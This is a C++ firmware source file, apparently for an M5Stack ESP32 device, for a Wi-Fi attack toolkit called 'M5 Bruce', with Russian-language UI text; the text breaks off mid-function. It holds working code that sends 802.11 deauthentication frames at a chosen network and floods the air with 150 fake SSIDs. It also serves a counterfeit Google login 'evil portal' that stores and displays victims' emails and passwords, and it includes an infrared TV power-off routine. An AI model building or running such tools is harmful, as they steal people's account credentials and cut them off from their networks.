#include <SPIFFS.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <M5Unified.h>

// ================= НАСТРОЙКИ =================
const char* ssid     = "M5_Bruce"; 
// Сеть открытая, без пароля

WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;

bool isSpamming = false;
bool isTvKilling = false;
bool isDeauthing = false;
bool isEvilPortalActive = true; 
unsigned long lastBeaconTime = 0;
unsigned long lastDeauthTime = 0;
int packetCount = 0;

// ================= ИК =================
#define IR_PIN 43

// ================= ДЕАУТ =================
uint8_t target_bssid[6] = {0};
uint8_t target_channel = 1;
bool scan_in_progress = false;

// ================= ЛОГИ =================
String logs = "";

// ================= ПРОТОТИПЫ =================
void drawUI();
void killTvBrand(int region, int brand);
void killAllTv(int region);
void sendBeaconSpam();
void sendDeauth();
void setupServer();
void sendRawCode(const uint16_t *times, const uint8_t *codes, int numPairs, int bitsPerIndex, int freq);
void savePassword(String email, String pass);
void loadLogs();
void saveLogsToFile();

// ================= 12 ТЕМ =================
struct Theme { uint16_t bg; uint16_t text; uint16_t accent; };
Theme themes[12] = {
  {BLACK, WHITE, RED}, {BLACK, GREEN, GREEN}, {NAVY, CYAN, WHITE}, {MAROON, YELLOW, WHITE},
  {DARKGREY, WHITE, ORANGE}, {PURPLE, PINK, WHITE}, {DARKGREEN, CYAN, WHITE}, {WHITE, BLACK, BLUE},
  {DARKCYAN, WHITE, YELLOW}, {OLIVE, WHITE, YELLOW}, {BLACK, MAGENTA, CYAN}, {DARKGREY, WHITE, WHITE}
};
int currentTheme = 0;

// ================= 150 СЕТЕЙ =================
const char* spam_ssids[] = {
  "Free_Public_WiFi", "FBI_Surveillance_Van", "Virus_Detected", "Windows_Update", "Update_Required",
  "Do_Not_Connect", "Hack_Me", "No_Internet", "WiFi_Error", "Connect_To_Continue",
  "Fake_Network", "M5Stack_Hack", "System_Alert", "Security_Breach", "Admin_Login",
  "Free_Money", "CIA_WiFi", "NSA_Spy", "Police_Van", "Trojan_Horse",
  "WiFi_Stealer", "Password_Required", "Network_Error", "Access_Denied", "Router_Reset",
  "Free_Internet", "Coffee_Shop", "Airport_WiFi", "Hotel_Guest", "McDonalds_Free",
  "Starbucks_WiFi", "Public_Hotspot", "Free_Download", "Click_Here", "Fake_App",
  "Update_Your_Phone", "iPhone_WiFi", "Android_Network", "Samsung_Update", "Xiaomi_WiFi",
  "Huawei_5G", "NSA_Backdoor", "FBI_Watch", "CIA_Drone", "KGB_WiFi",
  "Free_VPN", "Proxy_Server", "Tor_Network", "Dark_Web", "Deep_Web",
  "Hacked_Network", "Your_Phone_Is_Infected", "Ransomware", "Pay_To_Unlock", "Bitcoin_WiFi",
  "Free_Crypto", "Mining_Pool", "Fake_Bank", "Sberbank_WiFi", "Tinkoff_Network",
  "VTB_Free", "Alfa_WiFi", "PayPal_Login", "Amazon_Free", "Google_WiFi",
  "Apple_Store", "Microsoft_Update", "Windows_11_Free", "Linux_Mint", "Ubuntu_Network",
  "Hacker_Zone", "Darknet_Market", "Black_Market", "Free_Weed", "Free_Alcohol",
  "Free_Pizza", "Free_Beer", "Free_Sex", "Free_Drugs", "Free_Guns",
  "Police_Department", "Ambulance", "Fire_Department", "Emergency_WiFi", "911_Network",
  "SOS", "Help_Me", "I_Am_Lost", "Lost_Password", "Find_My_Phone",
  "Free_Data", "Unlimited_Internet", "5G_Free", "LTE_Free", "4G_Free",
  "WiFi_Unlimited", "No_Limit", "Free_Speed", "Fast_Internet", "Slow_Network",
  "Broken_WiFi", "Not_Working", "Error_404", "Error_500", "Server_Down",
  "Under_Attack", "DDoS_Attack", "SQL_Injection", "XSS_Attack", "Zero_Day",
  "Root_Access", "Admin_Access", "Superuser", "Root_Me", "Hack_The_Planet",
  "Free_Netflix", "Free_YouTube", "Free_Spotify", "Free_Telegram", "Free_WhatsApp",
  "VK_Free", "OK_Free", "Instagram_Free", "TikTok_Free", "Twitter_Free",
  "Facebook_Free", "Snapchat_Free", "Telegram_Spam", "WhatsApp_Hack", "Viber_Free",
  "Skype_Free", "Zoom_Meeting", "Discord_Free", "Twitch_Free", "Steam_Free",
  "Free_Games", "Free_Steam", "Free_V-Bucks", "Free_Robux", "Free_Minecraft",
  "Free_Fortnite", "Free_PUBG", "Free_GTA", "Free_Counter-Strike", "Free_Dota",
  "Free_LoL", "Free_Valorant", "Free_Apex", "Free_Warzone", "Free_CallOfDuty",
  "Free_Hack", "Free_Cheat", "Free_Bot", "Free_Script", "Free_Exploit",
  "Free_Key", "Free_License", "Free_Serial", "Free_Crack", "Free_Patch",
  "Free_Activation", "Free_Premium", "Free_VIP", "Free_Pro", "Free_Ultimate"
};
const int num_ssids = sizeof(spam_ssids) / sizeof(spam_ssids[0]);

// ================= БАЗА КОДОВ ТВ =================
struct IrCode {
  uint32_t freq;
  uint8_t numPairs;
  uint8_t bitsPerIndex;
  const uint16_t *times;
  const uint8_t *codes;
};

const uint16_t samsung_na_times[] = { 60, 60, 60, 2700, 120, 60, 240, 60 };
const uint8_t samsung_na_codes[] = { 0xE2, 0x20, 0x80, 0x78, 0x88, 0x20, 0x10 };
const struct IrCode samsung_na_code = { 38400, 26, 2, samsung_na_times, samsung_na_codes };

const uint16_t lg_na_times[] = { 50, 100, 50, 200, 50, 800, 400, 400 };
const uint8_t lg_na_codes[] = { 0xD5, 0x41, 0x11, 0x00, 0x14, 0x44, 0x6D, 0x54, 0x11, 0x10, 0x01, 0x44, 0x45 };
const struct IrCode lg_na_code = { 57143, 52, 2, lg_na_times, lg_na_codes };

const uint16_t philips_eu_times[] = { 36, 36, 36, 105, 36, 800, 400, 400 };
const uint8_t philips_eu_codes[] = { 0x0C, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
const struct IrCode philips_eu_code = { 36000, 14, 2, philips_eu_times, philips_eu_codes };

const uint16_t pana_eu_times[] = { 26, 185, 27, 80, 27, 185, 27, 4549 };
const uint8_t pana_eu_codes[] = { 0x15, 0x5A, 0x65, 0x67, 0x95, 0x65, 0x9A, 0x9B, 0x99 };
const struct IrCode pana_eu_code = { 38610, 64, 2, pana_eu_times, pana_eu_codes };

const struct IrCode* na_codes[][3] = {
  { &samsung_na_code, NULL, NULL },
  { &lg_na_code, NULL, NULL }
};
const int num_na_brands = 2;

const struct IrCode* eu_codes[][3] = {
  { &philips_eu_code, NULL, NULL },
  { &pana_eu_code, NULL, NULL }
};
const int num_eu_brands = 2;

// ================= HTML WEBUI =================
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE HTML><html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>M5 Bruce</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; }
    body { font-family: 'Courier New', Courier, monospace; background: #000; color: #fff; overflow: hidden; }
    #app { height: 100vh; display: flex; flex-direction: column; position: relative; overflow: hidden; }
    .page { position: absolute; top: 0; left: 0; width: 100%; height: 100%; padding: 20px 20px 80px 20px; display: flex; flex-direction: column; transition: transform 0.3s ease, opacity 0.3s ease; overflow-y: auto; background: #000; }
    .page.hidden { transform: translateX(100%); opacity: 0; pointer-events: none; }
    .page.active { transform: translateX(0); opacity: 1; }
    h1 { font-size: 24px; color: #fff; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 2px; border-bottom: 2px solid #fff; padding-bottom: 10px; font-weight: bold; }
    h2 { font-size: 18px; color: #fff; margin-bottom: 15px; margin-top: 20px; text-transform: uppercase; border-bottom: 1px solid #555; padding-bottom: 5px; }
    .menu-btn { background: #000; border: 2px solid #fff; border-radius: 0; padding: 20px; margin-bottom: 15px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; transition: 0.1s; color: #fff; }
    .menu-btn:active { background: #fff; color: #000; }
    .menu-btn:active .text, .menu-btn:active .icon, .menu-btn:active .arrow { color: #000; }
    .menu-btn .icon { font-size: 32px; margin-right: 15px; }
    .menu-btn .text { font-size: 20px; font-weight: bold; flex: 1; text-align: left; letter-spacing: 1px; }
    .menu-btn .arrow { font-size: 24px; }
    button { background: #000; color: #fff; border: 2px solid #fff; padding: 15px; border-radius: 0; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; font-family: inherit; }
    button:active { background: #fff; color: #000; }
    select { padding: 12px; width: 100%; margin-bottom: 15px; background: #000; color: #fff; border: 2px solid #fff; border-radius: 0; font-size: 16px; outline: none; font-family: inherit; text-transform: uppercase; appearance: none; }
    #backBtn { position: fixed; bottom: 0; left: 0; width: 100%; background: #fff; color: #000; border: none; padding: 20px; font-size: 18px; font-weight: bold; cursor: pointer; z-index: 100; border-radius: 0; display: none; text-transform: uppercase; font-family: inherit; }
    #backBtn:active { background: #555; }
    .status-box { padding: 15px; background: #000; border: 2px solid #fff; margin-bottom: 15px; font-size: 14px; text-transform: uppercase; }
    #scan-results { max-height: 250px; overflow-y: auto; background: #000; border: 2px solid #fff; padding: 10px; margin-bottom: 15px; text-align: left; font-size: 13px; }
    .net-item { padding: 10px; border-bottom: 1px dashed #555; cursor: pointer; text-transform: uppercase; }
    .net-item:active { background: #fff; color: #000; }
    .net-item.selected { background: #fff; color: #000; font-weight: bold; border-bottom: 2px solid #fff; }
    #logs { background: #000; color: #fff; font-family: monospace; font-size: 12px; padding: 10px; border: 2px solid #fff; height: 200px; overflow-y: auto; margin-bottom: 15px; white-space: pre-wrap; }
    .hidden { display: none !important; }
    .btn-row { display: flex; gap: 10px; }
  </style>
</head>
<body>
  <div id="app">
    
    <div id="page-main" class="page active">
      <h1>M5 BRUCE</h1>
      <div class="menu-btn" onclick="goTo('page-wifi')">
        <span class="icon">[+]</span><span class="text">WI-FI АТАКИ</span><span class="arrow">></span>
      </div>
      <div class="menu-btn" onclick="goTo('page-ir')">
        <span class="icon">[~]</span><span class="text">ИК-ПУЛЬТ (TV-B-GONE)</span><span class="arrow">></span>
      </div>
      <div class="menu-btn" onclick="goTo('page-logs')">
        <span class="icon">[*]</span><span class="text">ЛОГИ / ПАРОЛИ</span><span class="arrow">></span>
      </div>
    </div>

    <div id="page-wifi" class="page hidden">
      <h1>WI-FI АТАКИ</h1>
      <div class="menu-btn" onclick="goTo('page-deauth')">
        <span class="icon">[!]</span><span class="text">TARGET DEAUTH</span><span class="arrow">></span>
      </div>
      <div class="menu-btn" onclick="goTo('page-beacon')">
        <span class="icon">[>]</span><span class="text">BEACON SPAM (150)</span><span class="arrow">></span>
      </div>
      <div class="menu-btn" onclick="goTo('page-portal')">
        <span class="icon">[?]</span><span class="text">EVIL PORTAL</span><span class="arrow">></span>
      </div>
    </div>

    <div id="page-deauth" class="page hidden">
      <h1>TARGET DEAUTH</h1>
      <button onclick="scanNetworks()">СКАНИРОВАТЬ СЕТИ</button>
      <div id="scan-results">НАЖМИТЕ "СКАНИРОВАТЬ"</div>
      <button id="btnDeauth" onclick="toggleDeauth()" class="hidden">АТАКОВАТЬ</button>
      <div id="status-deauth" class="status-box">НЕ АКТИВНО</div>
    </div>

    <div id="page-beacon" class="page hidden">
      <h1>BEACON SPAM</h1>
      <p style="color: #aaa; margin-bottom: 15px;">СОЗДАЕТ 150 ФЕЙКОВЫХ СЕТЕЙ WI-FI.</p>
      <button id="btnWifi" onclick="toggleWifi()">ЗАГРУЗКА...</button>
      <div id="status-wifi" class="status-box">ПРОВЕРКА...</div>
    </div>

    <div id="page-portal" class="page hidden">
      <h1>EVIL PORTAL</h1>
      <p style="color: #aaa; margin-bottom: 15px;">ФЕЙКОВАЯ СТРАНИЦА GOOGLE. ЖЕРТВА ВВОДИТ ПАРОЛЬ.</p>
      <button id="btnPortal" onclick="togglePortal()">ЗАПУСТИТЬ ПОРТАЛ</button>
      <div id="status-portal" class="status-box">НЕ АКТИВНО</div>
      <h2>ПОХИЩЕННЫЕ ДАННЫЕ:</h2>
      <div id="logs">ОЖИДАНИЕ...</div>
    </div>

    <div id="page-ir" class="page hidden">
      <h1>ИК-ПУЛЬТ</h1>
      <p style="color: #aaa; margin-bottom: 15px;">ВЫБЕРИТЕ РЕГИОН ДЛЯ TV-B-GONE.</p>
      <div class="menu-btn" onclick="goTo('page-tvbg-na')">
        <span class="icon">[A]</span><span class="text">REGION NA (АМЕРИКА/АЗИЯ)</span><span class="arrow">></span>
      </div>
      <div class="menu-btn" onclick="goTo('page-tvbg-eu')">
        <span class="icon">[E]</span><span class="text">REGION EU (ЕВРОПА)</span><span class="arrow">></span>
      </div>
    </div>

    <div id="page-tvbg-na" class="page hidden">
      <h1>TV-B-GONE NA</h1>
      <select id="tvSelectNA">
        <option value="0">SAMSUNG (NA)</option>
        <option value="1">LG (NA)</option>
      </select>
      <button onclick="killTvNA()">ВЫКЛЮЧИТЬ ВЫБРАННЫЙ</button>
      <button onclick="killAllNA()">ВЫКЛЮЧИТЬ ВСЕ (NA)</button>
      <div id="status-tv-na" class="status-box">ОЖИДАНИЕ...</div>
    </div>

    <div id="page-tvbg-eu" class="page hidden">
      <h1>TV-B-GONE EU</h1>
      <select id="tvSelectEU">
        <option value="0">PHILIPS (EU)</option>
        <option value="1">PANASONIC (EU)</option>
      </select>
      <button onclick="killTvEU()">ВЫКЛЮЧИТЬ ВЫБРАННЫЙ</button>
      <button onclick="killAllEU()">ВЫКЛЮЧИТЬ ВСЕ (EU)</button>
      <div id="status-tv-eu" class="status-box">ОЖИДАНИЕ...</div>
    </div>

    <div id="page-logs" class="page hidden">
      <h1>ЛОГИ</h1>
      <div class="btn-row">
        <button onclick="downloadLogs()">СКАЧАТЬ</button>
        <button onclick="clearLogs()">ОЧИСТИТЬ</button>
      </div>
      <div id="logs-main">ПУСТО...</div>
    </div>

    <button id="backBtn" onclick="goBack()">< НАЗАД</button>
  </div>

  <script>
    let history = ['page-main'];
    function goTo(pageId) {
      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
      document.getElementById(pageId).classList.add('active');
      history.push(pageId);
      if(pageId !== 'page-main') document.getElementById('backBtn').style.display = 'block';
      if(pageId === 'page-logs') fetchLogs();
    }
    function goBack() {
      if(history.length > 1) {
        history.pop();
        let prev = history[history.length - 1];
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById(prev).classList.add('active');
        if(prev === 'page-main') document.getElementById('backBtn').style.display = 'none';
      }
    }

    let isWifiOn = false;
    function toggleWifi() {
      let ep = isWifiOn ? '/wifi/off' : '/wifi/on';
      fetch(ep).then(r => r.text()).then(() => updateWifiUI());
    }
    function updateWifiUI() {
      fetch('/status').then(r => r.text()).then(t => {
        isWifiOn = (t === 'ON');
        let btn = document.getElementById('btnWifi');
        let stat = document.getElementById('status-wifi');
        if(isWifiOn) { btn.innerText = 'ВЫКЛЮЧИТЬ СПАМ'; stat.innerText = 'СПАМ АКТИВЕН'; }
        else { btn.innerText = 'ВКЛЮЧИТЬ СПАМ'; stat.innerText = 'СПАМ ВЫКЛЮЧЕН'; }
      });
    }

    let isDeauthOn = false;
    let selectedBssid = "";
    let selectedChannel = 0;
    function scanNetworks() {
      document.getElementById('scan-results').innerText = "СКАНИРОВАНИЕ...";
      fetch('/scan').then(r => r.text()).then(data => {
        document.getElementById('scan-results').innerHTML = data;
        let items = document.querySelectorAll('.net-item');
        items.forEach(item => {
          item.onclick = function() {
            items.forEach(i => i.classList.remove('selected'));
            this.classList.add('selected');
            selectedBssid = this.dataset.bssid;
            selectedChannel = this.dataset.channel;
            document.getElementById('btnDeauth').classList.remove('hidden');
            document.getElementById('status-deauth').innerText = "ВЫБРАНА: " + this.dataset.ssid;
          };
        });
      });
    }
    function toggleDeauth() {
      if(!selectedBssid) { alert("ВЫБЕРИ СЕТЬ!"); return; }
      let ep = isDeauthOn ? '/deauth/off' : '/deauth/on';
      let url = ep;
      if(!isDeauthOn) url += '?bssid=' + selectedBssid + '&channel=' + selectedChannel;
      fetch(url).then(r => r.text()).then(t => {
        isDeauthOn = !isDeauthOn;
        let btn = document.getElementById('btnDeauth');
        if(isDeauthOn) { btn.innerText = 'ОСТАНОВИТЬ'; document.getElementById('status-deauth').innerText = "АТАКА!"; }
        else { btn.innerText = 'АТАКОВАТЬ'; document.getElementById('status-deauth').innerText = "НЕ АКТИВНО"; }
      });
    }

    let isPortalOn = false;
    function togglePortal() {
      let ep = isPortalOn ? '/portal/off' : '/portal/on';
      fetch(ep).then(r => r.text()).then(t => {
        isPortalOn = !isPortalOn;
        let btn = document.getElementById('btnPortal');
        let stat = document.getElementById('status-portal');
        if(isPortalOn) { btn.innerText = 'ОСТАНОВИТЬ ПОРТАЛ'; stat.innerText = 'ПОРТАЛ АКТИВЕН'; }
        else { btn.innerText = 'ЗАПУСТИТЬ ПОРТАЛ'; stat.innerText = 'НЕ АКТИВНО'; }
      });
    }

    function fetchLogs() {
      fetch('/logs').then(r => r.text()).then(t => {
        document.getElementById('logs-main').innerText = t;
        document.getElementById('logs').innerText = t;
      });
    }
    function downloadLogs() {
      window.location.href = '/download_logs';
    }
    function clearLogs() {
      fetch('/clear_logs').then(r => r.text()).then(t => {
        document.getElementById('logs-main').innerText = "ПУСТО...";
        document.getElementById('logs').innerText = "ОЖИДАНИЕ...";
      });
    }

    function killTvNA() {
      let brand = document.getElementById('tvSelectNA').value;
      document.getElementById('status-tv-na').innerText = "СТРЕЛЯЕМ...";
      fetch('/tv/kill?region=0&brand=' + brand).then(r => r.text()).then(t => { document.getElementById('status-tv-na').innerText = t; });
    }
    function killAllNA() {
      document.getElementById('status-tv-na').innerText = "РАССТРЕЛ ВСЕХ (NA)...";
      fetch('/tv/killall?region=0').then(r => r.text()).then(t => { document.getElementById('status-tv-na').innerText = t; });
    }
    function killTvEU() {
      let brand = document.getElementById('tvSelectEU').value;
      document.getElementById('status-tv-eu').innerText = "СТРЕЛЯЕМ...";
      fetch('/tv/kill?region=1&brand=' + brand).then(r => r.text()).then(t => { document.getElementById('status-tv-eu').innerText = t; });
    }
    function killAllEU() {
      document.getElementById('status-tv-eu').innerText = "РАССТРЕЛ ВСЕХ (EU)...";
      fetch('/tv/killall?region=1').then(r => r.text()).then(t => { document.getElementById('status-tv-eu').innerText = t; });
    }

    setInterval(updateWifiUI, 2000);
    updateWifiUI();
  </script>
</body>
</html>
)rawliteral";

// ================= EVIL PORTAL HTML =================
const char portal_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in - Google Accounts</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Roboto', sans-serif; background: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; }
  .container { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
  .logo { text-align: center; margin-bottom: 20px; }
  h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 10px; }
  p { text-align: center; margin-bottom: 20px; color: #5f6368; }
  input { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 15px; font-size: 16px; outline: none; }
  input:focus { border: 2px solid #1a73e8; padding: 11px; }
  button { width: 100%; background: #1a73e8; color: white; border: none; padding: 12px; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: 500; }
  button:hover { background: #1b66c9; }
  .footer { margin-top: 20px; font-size: 12px; color: #5f6368; text-align: center; }
</style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <svg viewBox="0 0 24 24" width="75" height="75"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
    </div>
    <h1>Вход</h1>
    <p>Используйте аккаунт Google</p>
    <form action="/login" method="POST">
      <input type="email" name="email" placeholder="Email" required>
      <input type="password" name="password" placeholder="Пароль" required>
      <button type="submit">Далее</button>
    </form>
    <div class="footer">Это фейковая страница для тестов.</div>
  </div>
</body></html>
)rawliteral";

// ================= ЛОГИ ФУНКЦИИ =================
void loadLogs() {
  File f = SPIFFS.open("/logs.txt", "r");
  if (f) {
    logs = f.readString();
    f.close();
  }
}

void saveLogsToFile() {
  File f = SPIFFS.open("/logs.txt", "w");
  if (f) {
    f.print(logs);
    f.close();
  }
}

void savePassword(String email, String pass) {
  logs += "Email: " + email + "\nPass: " + pass + "\n---\n";
  saveLogsToFile();
  
  M5.Display.fillScreen(BLACK);
  M5.Display.setTextColor(WHITE);
  M5.Display.setCursor(10, 10);
  M5.Display.print("PASS CAPTURED!");
  M5.Display.setCursor(10, 30);
  M5.Display.print(email);
  M5.Display.setCursor(10, 50);
  M5.Display.print(pass);
  delay(3000);
  drawUI();
}

// ================= ОТРИСОВКА МЕНЮ =================
void drawUI() {
  Theme t = themes[currentTheme];
  M5.Display.fillScreen(t.bg);
  M5.Display.setTextColor(t.text);
  M5.Display.setTextSize(2);
  M5.Display.setCursor(10, 10);
  M5.Display.print("BRUCE");
  M5.Display.drawLine(0, 35, 135, 35, t.accent);
  
  M5.Display.setTextSize(1);
  M5.Display.setCursor(10, 45);
  M5.Display.print("Beacon: ");
  M5.Display.setTextColor(isSpamming ? t.accent : t.text);
  M5.Display.print(isSpamming ? "ON" : "OFF");
  
  M5.Display.setTextColor(t.text);
  M5.Display.setCursor(10, 60);
  M5.Display.print("Deauth: ");
  M5.Display.setTextColor(isDeauthing ? RED : t.text);
  M5.Display.print(isDeauthing ? "ACTIVE" : "OFF");
  
  M5.Display.setTextColor(t.text);
  M5.Display.setCursor(10, 75);
  M5.Display.print("Portal: ");
  M5.Display.setTextColor(isEvilPortalActive ? MAGENTA : t.text);
  M5.Display.print(isEvilPortalActive ? "ON" : "OFF");
  
  M5.Display.setTextColor(t.text);
  M5.Display.setCursor(10, 90);
  M5.Display.print("Packets: "); M5.Display.print(packetCount);
  M5.Display.setCursor(10, 105);
  M5.Display.print("IP: ");
  if (strlen(ssid) > 0) M5.Display.print(WiFi.localIP());
  else { M5.Display.print(WiFi.softAPIP()); }
  
  if (isDeauthing) {
    M5.Display.setTextColor(RED);
    M5.Display.setCursor(10, 120);
    M5.Display.print("Target: ");
    char bssid_str[18];
    sprintf(bssid_str, "%02X:%02X:%02X:%02X:%02X:%02X", target_bssid[0], target_bssid[1], target_bssid[2], target_bssid[3], target_bssid[4], target_bssid[5]);
    M5.Display.print(bssid_str);
  }
}

// ================= ДЕАУТ =================
void sendDeauth() {
  uint8_t packet[26] = {
    0xC0, 0x00, 0x00, 0x00, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    target_bssid[0], target_bssid[1], target_bssid[2], target_bssid[3], target_bssid[4], target_bssid[5], 
    target_bssid[0], target_bssid[1], target_bssid[2], target_bssid[3], target_bssid[4], target_bssid[5], 
    0x00, 0x00, 0x07, 0x00  
  };
  esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false);
  packetCount++;
}

// ================= ИК ОТПРАВКА =================
void sendRawCode(const uint16_t *times, const uint8_t *codes, int numPairs, int bitsPerIndex, int freq) {
  ledcAttach(IR_PIN, freq, 8);
  
  int bitPos = 0;
  for (int i = 0; i < numPairs; i++) {
    uint8_t val = 0;
    for (int b = 0; b < bitsPerIndex; b++) {
      if (bitPos / 8 >= numPairs) break;
      val |= ((codes[bitPos / 8] >> (7 - (bitPos % 8))) & 1) << (bitsPerIndex - 1 - b);
      bitPos++;
    }
    
    if (val < 8) {
      ledcWrite(IR_PIN, 128);
      delayMicroseconds(times[val * 2]);
      ledcWrite(IR_PIN, 0);
      delayMicroseconds(times[val * 2 + 1]);
    }
  }
}

void killTvBrand(int region, int brand) {
  isTvKilling = true;
  M5.Display.fillScreen(BLACK);
  M5.Display.setTextColor(RED);
  M5.Display.setTextSize(2);
  M5.Display.setCursor(10, 40);
  M5.Display.print("FIRE!");
  
  const struct IrCode* (*region_codes)[3] = (region == 0) ? na_codes : eu_codes;
  int num_brands = (region == 0) ? num_na_brands : num_eu_brands;
  
  if (brand >= num_brands) return;
  
  for (int j = 0; j < 3; j++) {
    for (int i = 0; i < 3; i++) {
      const struct IrCode *c = region_codes[brand][i];
      if (c == NULL) break;
      sendRawCode(c->times, c->codes, c->numPairs, c->bitsPerIndex, c->freq);
      delay(50);
    }
  }
  
  isTvKilling = false;
  drawUI();
}

void killAllTv(int region) {
  isTvKilling = true;
  M5.Display.fillScreen(BLACK);
  M5.Display.setTextColor(RED);
  M5.Display.setTextSize(2);
  M5.Display.setCursor(10, 40);
  M5.Display.print("KILL ALL");
  M5.Display.setCursor(10, 70);
  M5.Display.print("TV!");
  
  const struct IrCode* (*region_codes)[3] = (region == 0) ? na_codes : eu_codes;
  int num_brands = (region == 0) ? num_na_brands : num_eu_brands;
  
  for (int b = 0; b < num_brands; b++) {
    for (int j = 0; j < 3; j++) { 
      for (int i = 0; i < 3; i++) {
        const struct IrCode *c = region_codes[b][i];
        if (c == NULL) break;
        sendRawCode(c->times, c->codes, c->numPairs, c->bitsPerIndex, c->freq);
        delay(50);
      }
    }
  }
  
  isTvKilling = false;
  drawUI();
}

// ================= СПАМ =================
void sendBeaconSpam() {
  uint8_t packet[128] = {0};
  packet[0] = 0x80; packet[1] = 0x00; packet[2] = 0x00; packet[3] = 0x00; 
  for(int i=4; i<10; i++) packet[i] = 0xFF; 
  for(int i=10; i<16; i++) packet[i] = random(0, 255);
  for(int i=16; i<22; i++) packet[i] = random(0, 255);
  packet[22] = 0x00; packet[23] = 0x00;
  for(int i=24; i<32; i++) packet[i] = random(0, 255);
  packet[32] = 0x64; packet[33] = 0x00; packet[34] = 0x11; packet[35] = 0x04;

  int ssidIndex = random(0, num_ssids);
  int ssidLen = strlen(spam_ssids[ssidIndex]);
  int len = 36;
  
  packet[len++] = 0x00; packet[len++] = ssidLen;
  memcpy(&packet[len], spam_ssids[ssidIndex], ssidLen); len += ssidLen;
  packet[len++] = 0x03; packet[len++] = 0x01; 
  packet[len++] = random(1, 14); 

  esp_wifi_80211_tx(WIFI_IF_AP, packet, len, false);
  packetCount++;
}

// ================= ВЕБ-СЕРВЕР =================
void setupServer() {
  server.on("/", HTTP_GET, [](){ server.send_P(200, "text/html", index_html); });
  
  server.on("/wifi/on", HTTP_GET, [](){ isSpamming = true; drawUI(); server.send(200, "text/plain", "ON"); });
  server.on("/wifi/off", HTTP_GET, [](){ isSpamming = false; drawUI(); server.send(200, "text/plain", "OFF"); });
  server.on("/status", HTTP_GET, [](){ server.send(200, "text/plain", isSpamming ? "ON" : "OFF"); });
  
  server.on("/logs", HTTP_GET, [](){ server.send(200, "text/plain", logs); });
  
  server.on("/download_logs", HTTP_GET, [](){
    server.sendHeader("Content-Disposition", "attachment; filename=logs.txt");
    server.send(200, "text/plain", logs);
  });
  
  server.on("/clear_logs", HTTP_GET, [](){
    logs = "";
    SPIFFS.remove("/logs.txt");
    server.send(200, "text/plain", "CLEARED");
  });

  server.on("/scan", HTTP_GET, [](){
    if(scan_in_progress) { server.send(200, "text/html", "СКАНИРОВАНИЕ УЖЕ ИДЕТ..."); return; }
    scan_in_progress = true;
    int n = WiFi.scanNetworks();
    String html = "";
    if (n == 0) html = "СЕТИ НЕ НАЙДЕНЫ.";
    else {
      for (int i = 0; i < n; ++i) {
        String s = WiFi.SSID(i);
        if(s.length() == 0) s = "[СКРЫТАЯ]";
        String bssid = WiFi.BSSIDstr(i);
        int ch = WiFi.channel(i);
        int rssi = WiFi.RSSI(i);
        html += "<div class='net-item' data-bssid='" + bssid + "' data-channel='" + String(ch) + "' data-ssid='" + s + "'>";
        html += s + " | CH: " + String(ch) + " | " + String(rssi) + "dBm</div>";
      }
    }
    WiFi.scanDelete();
    scan_in_progress = false;
    server.send(200, "text/html", html);
  });

  server.on("/deauth/on", HTTP_GET, [](){
    if (server.hasArg("bssid") && server.hasArg("channel")) {
      String bssidStr = server.arg("bssid");
      sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
             &target_bssid[0], &target_bssid[1], &target_bssid[2], 
             &target_bssid[3], &target_bssid[4], &target_bssid[5]);
      target_channel = server.arg("channel").toInt();
      esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
      isDeauthing = true;
      drawUI();
      server.send(200, "text/plain", "DEAUTH ON");
    } else server.send(400, "text/plain", "NO BSSID");
  });

  server.on("/deauth/off", HTTP_GET, [](){
    isDeauthing = false;
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    drawUI();
    server.send(200, "text/plain", "DEAUTH OFF");
  });

  server.on("/tv/kill", HTTP_GET, [](){
    if (server.hasArg("brand") && server.hasArg("region")) {
      int brand = server.arg("brand").toInt();
      int region = server.arg("region").toInt();
      killTvBrand(region, brand);
      server.send(200, "text/plain", "FIRED!");
    } else server.send(400, "text/plain", "NO BRAND");
  });

  server.on("/tv/killall", HTTP_GET, [](){
